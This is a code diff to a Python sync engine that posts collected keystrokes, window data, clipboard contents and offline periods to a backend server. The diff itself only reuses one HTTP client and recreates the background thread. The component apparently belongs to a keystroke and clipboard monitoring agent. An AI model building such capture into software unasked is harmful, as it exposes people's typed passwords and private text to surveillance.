@@ -40,6 +40,7 @@ class SyncEngine:
     def start(self) -> None:
         """Starts the background staggered sync loop."""
         self._stop_event.clear()
+        self._thread = threading.Thread(target=self._loop, daemon=True)
         self._thread.start()
         
     def stop(self) -> None:
@@ -72,23 +73,24 @@ class SyncEngine:
             "Content-Type": "application/json"
         }
         
-        # Track success of all endpoints to manage offline state
-        success_k = self._upload_endpoint("/sync/keystrokes", "keystrokes", keystrokes, synced_at, headers)
-        if success_k:
-            self._keystroke_collector.pop(len(keystrokes))
-        time.sleep(random.uniform(1, 3))
-        
-        success_w = self._upload_endpoint("/sync/windows", "windows", windows, synced_at, headers)
-        if success_w:
-            self._window_collector.pop(len(windows))
-        time.sleep(random.uniform(1, 3))
-        
-        success_c = self._upload_endpoint("/sync/clipboard", "clipboard", clipboard, synced_at, headers)
-        if success_c:
-            self._clipboard_collector.pop(len(clipboard))
-        time.sleep(random.uniform(1, 3))
-        
-        success_o = self._upload_endpoint("/sync/offline", "offline_periods", self._offline_periods, synced_at, headers)
+        # Track success of all endpoints to manage offline state using a single connection pool
+        with httpx.Client(timeout=15.0) as client:
+            success_k = self._upload_endpoint("/sync/keystrokes", "keystrokes", keystrokes, synced_at, headers, client)
+            if success_k:
+                self._keystroke_collector.pop(len(keystrokes))
+            time.sleep(random.uniform(1, 3))
+            
+            success_w = self._upload_endpoint("/sync/windows", "windows", windows, synced_at, headers, client)
+            if success_w:
+                self._window_collector.pop(len(windows))
+            time.sleep(random.uniform(1, 3))
+            
+            success_c = self._upload_endpoint("/sync/clipboard", "clipboard", clipboard, synced_at, headers, client)
+            if success_c:
+                self._clipboard_collector.pop(len(clipboard))
+            time.sleep(random.uniform(1, 3))
+            
+            success_o = self._upload_endpoint("/sync/offline", "offline_periods", self._offline_periods, synced_at, headers, client)
         
         if success_o:
             self._offline_periods = []
@@ -109,7 +111,7 @@ class SyncEngine:
                 # Connection was just lost; record the moment
                 self._disconnected_at = synced_at
 
-    def _upload_endpoint(self, route: str, payload_key: str, data_list: list, synced_at: str, headers: dict) -> bool:
+    def _upload_endpoint(self, route: str, payload_key: str, data_list: list, synced_at: str, headers: dict, client: httpx.Client) -> bool:
         """Helper to POST specific datasets synchronously with error handling."""
         url = f"{settings.BACKEND_URL.rstrip('/')}{route}"
         payload = {
@@ -120,8 +122,7 @@ class SyncEngine:
         }
         
         try:
-            with httpx.Client(timeout=15.0) as client:
-                response = client.post(url, headers=headers, json=payload)
+            response = client.post(url, headers=headers, json=payload)
             response.raise_for_status()
             return True
         except Exception as e:
